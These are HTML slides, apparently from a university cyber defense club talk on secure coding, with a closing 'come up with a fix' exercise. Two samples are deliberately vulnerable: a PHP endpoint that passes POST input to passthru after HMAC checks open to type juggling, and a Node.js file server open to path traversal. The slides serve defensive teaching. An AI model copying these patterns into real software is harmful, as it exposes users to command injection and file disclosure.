<h3 id="orgc9d9ad8"><span class="section-number-3">9.3.</span> Compare the following</h3>
<div class="org-src-container">

<pre  class="fragment appear"   ><code trim><span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">scanf</span><span style="color: #51afef;">(</span><span style="color: #51afef;">const</span> <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">format</span>, ...<span style="color: #51afef;">)</span>;
<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">fscanf</span><span style="color: #51afef;">(</span><span style="color: #a9a1e1;">FILE</span> <span style="color: #ECBE7B;">strict</span> <span style="color: #dcaeea;">stream</span>, <span style="color: #51afef;">const</span> <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">format</span>, ...<span style="color: #51afef;">)</span>;
</code></pre>
</div>

<div class="org-src-container">

<pre  class="fragment appear"   ><code trim><span style="color: #ECBE7B;">char</span> *<span style="color: #c678dd;">fgets</span><span style="color: #51afef;">(</span><span style="color: #ECBE7B;">char</span> *<span style="color: #dcaeea;">s</span>, <span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">size</span>, <span style="color: #ECBE7B;">FILE</span> *<span style="color: #dcaeea;">stream</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

<p class="fragment appear">
What&rsquo;s the main difference?
</p>

</section>
<section id="slide-org2e2e93f" data-background="../common/background.png">
<h3 id="org2e2e93f"><span class="section-number-3">9.4.</span> Where can you find vulnerabilities and alternatives like this?</h3>
<p class="fragment appear">
DuckDuckGo and Reddit
</p>

</section>
</section>
<section>
<section id="slide-org226398c" data-background="../common/background.png">
<h2 id="org226398c"><span class="section-number-2">10.</span> How can we secure Example 2?</h2>
<div class="outline-text-2" id="text-10">
</div>
</section>
<section id="slide-org1b59072" data-background="../common/background.png">
<h3 id="org1b59072"><span class="section-number-3">10.1.</span> Source code: Authentication and execution</h3>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #99bb66;">"SECRET"</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #99bb66;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #99bb66;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #99bb66;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #99bb66;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>

    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #99bb66;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #99bb66;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

</section>
<section id="slide-orga7ed216" data-background="../common/background.png">
<h3 id="orga7ed216"><span class="section-number-3">10.2.</span> Do not trust the types of your variables in weakly typed languages!</h3>
<p>
For PHP: <a href="https://www.php.net/manual/en/ref.var.php">https://www.php.net/manual/en/ref.var.php</a>
</p>
</section>
<section id="slide-orge4a76c2" data-background="../common/background.png">
<h3 id="orge4a76c2"><span class="section-number-3">10.3.</span> Enable strict error handling</h3>
<p>
Set strict error reporting level: <a href="https://www.php.net/manual/en/function.error-reporting.php">https://www.php.net/manual/en/function.error-reporting.php</a>
</p>

<div class="org-src-container">

<pre  class="fragment appear"   ><code trim>error_reporting<span style="color: #51afef;">(</span><span style="color: #a9a1e1;">E_ALL</span> | <span style="color: #a9a1e1;">E_STRICT</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>
</section>
</section>
<section>
<section id="slide-org5e6cfa6" data-background="../common/background.png">
<h2 id="org5e6cfa6"><span class="section-number-2">11.</span> What can you do to code that isn&rsquo;t yours?</h2>
<aside class="notes">
<p>
Include mention of DMs
</p>

</aside>

<p class="fragment appear">
Depends on the owner&rsquo;s code and policies
</p>

<p class="fragment appear">
Google Bug Bounty program: <a href="https://bughunters.google.com/about/rules/6625378258649088" class="fragment appear">https://bughunters.google.com/about/rules/6625378258649088</a>
</p>
</section>
</section>
<section>
<section id="slide-org1c30945" data-background="../common/background.png">
<h2 id="org1c30945"><span class="section-number-2">12.</span> Wasn&rsquo;t this whole presentation just reverse engineering?</h2>
<p class="fragment appear">
Maybe&#x2026;
</p>

<p class="fragment appear">
We need to know how to fix problems, not just identify and exploit them!
</p>

</section>
</section>
<section>
<section id="slide-org1cef93e" data-background="../common/background.png">
<h2 id="org1cef93e"><span class="section-number-2">13.</span> Questions?</h2>
</section>
</section>
<section>
<section id="slide-orgb13d3ff" data-background="../common/background.png">
<h2 id="orgb13d3ff"><span class="section-number-2">14.</span> Club exercise!</h2>
<div class="outline-text-2" id="text-14">
</div>
</section>
<section id="slide-orgb40f806" data-background="../common/background.png">
<h3 id="orgb40f806"><span class="section-number-3">14.1.</span> Situation description</h3>
<p class="fragment appear">
You are given a Node.js 16 server which provides user data
</p>

<p class="fragment appear">
There is a <code>/users</code> folder which in turn has folders which contain user files
</p>

<p class="fragment appear">
The server has to take the following parameters:
</p>

<ul class="fragment appear">
<li>userId (required): A user ID number</li>
<li>file (optional): The file to pull. Defaults to user.json</li>

</ul>

</section>
<section id="slide-org4fb565e" data-background="../common/background.png">
<h3 id="org4fb565e"><span class="section-number-3">14.2.</span> Challenge code</h3>
<div class="org-src-container">

<pre  class="src src-js"   ><code trim><span style="color: #525252;">// </span><span style="color: #525252;">Node.js 16</span>
<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">fs</span>   = require(<span style="color: #99bb66;">'node:fs'</span>);
<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">http</span> = require(<span style="color: #99bb66;">'node:http'</span>);
<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">Url</span>  = require(<span style="color: #99bb66;">'node:url'</span>);
<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">path</span> = require(<span style="color: #99bb66;">'node:path'</span>);

<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">server</span> = http.createServer((req, res) =&gt; {
    <span style="color: #51afef;">if</span> (req.url.startsWith(<span style="color: #99bb66;">'/user/'</span>)) {
        <span style="color: #51afef;">const</span> <span style="color: #dcaeea;">url</span> = <span style="color: #51afef;">new</span> <span style="color: #ECBE7B;">Url.URL</span>(<span style="color: #99bb66;">`http://${req.headers.host}${req.url}`</span>);

        <span style="color: #51afef;">if</span> (url.searchParams.get(<span style="color: #99bb66;">'userId'</span>) &amp;&amp; !isNaN(parseInt(url.searchParams.get(<span style="color: #99bb66;">'userId'</span>)))) {
            <span style="color: #525252;">// </span><span style="color: #525252;">Each user has a folder, go into that folder and get their user.json file</span>
            <span style="color: #525252;">// </span><span style="color: #525252;">and return the text</span>
            <span style="color: #51afef;">const</span> <span style="color: #dcaeea;">id</span> = url.searchParams.get(<span style="color: #99bb66;">'userId'</span>);
            <span style="color: #51afef;">const</span> <span style="color: #dcaeea;">userFile</span> = url.searchParams.get(<span style="color: #99bb66;">'file'</span>) ?? <span style="color: #99bb66;">'user.json'</span>;

            <span style="color: #51afef;">const</span> <span style="color: #dcaeea;">filePath</span> = path.resolve(<span style="color: #99bb66;">'/users'</span>, id, userFile);

            fs.readFile(filePath, (err, text) =&gt; {
                <span style="color: #51afef;">if</span> (err) <span style="color: #51afef;">throw</span> err;

                res.write(text.toString());
                res.end();
            });
        } <span style="color: #51afef;">else</span> {
            res.statusCode = <span style="color: #dd8844; font-weight: bold;">400</span>;
            res.end();
        }
    } <span style="color: #51afef;">else</span> {
        res.statusCode = <span style="color: #dd8844; font-weight: bold;">404</span>;
        res.end();
    }
});

server.listen(<span style="color: #dd8844; font-weight: bold;">8000</span>);
</code></pre>
</div>

</section>
<section id="slide-org88abf2a" data-background="../common/background.png">
<h3 id="org88abf2a"><span class="section-number-3">14.3.</span> Code is located in same GitHub repository</h3>
<p class="fragment appear">
<a href="https://github.com/r-a303931/lucdc-presentations" class="fragment appear">https://github.com/r-a303931/lucdc-presentations</a>
</p>

<p class="fragment appear">
<code>2022-02-03/challenges/challenge.js</code>
</p>

</section>
<section id="slide-org79a7d05" data-background="../common/background.png">
<h3 id="org79a7d05"><span class="section-number-3">14.4.</span> Your challenge:</h3>
<p>
Come up with a fix!
</p>

<p>
Message me your fix in Discord (Andrew#3967)
</p>
</section>
</section>
</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>

<script>
// Full list of configuration options available here:
// https://github.com/hakimel/reveal.js#configuration
Reveal.initialize({
transition: 'none',

// Optional libraries used to extend on reveal.js
dependencies: [
 { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }]

});

</script>
</body>
</html>
